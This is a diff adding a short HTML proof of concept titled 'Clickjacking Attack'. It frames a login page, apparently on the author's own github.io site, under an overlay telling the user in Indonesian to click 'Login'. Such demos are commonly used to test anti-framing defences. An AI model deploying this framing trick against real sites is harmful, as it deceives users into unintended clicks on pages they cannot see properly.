@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Clickjacking Attack</title>
+  <style>
+    html, body {
+      height: 100%;
+      margin: 0;
+      padding: 0;
+      background: #000;
+    }
+    #iframe {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      border: none;
+      z-index: 1;
+    }
+    #overlay {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.5);
+      z-index: 2;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    #overlay h1 {
+      color: white;
+      font-size: 24px;
+    }
+  </style>
+</head>
+<body>
+  <div id="overlay">
+    <h1>Klik TOMBOL "Login"</h1>
+  </div>
+  <iframe id="iframe" src="https://mrcobraa0-jpg.github.io/my-website/login"></iframe>
+</body>
+</html>
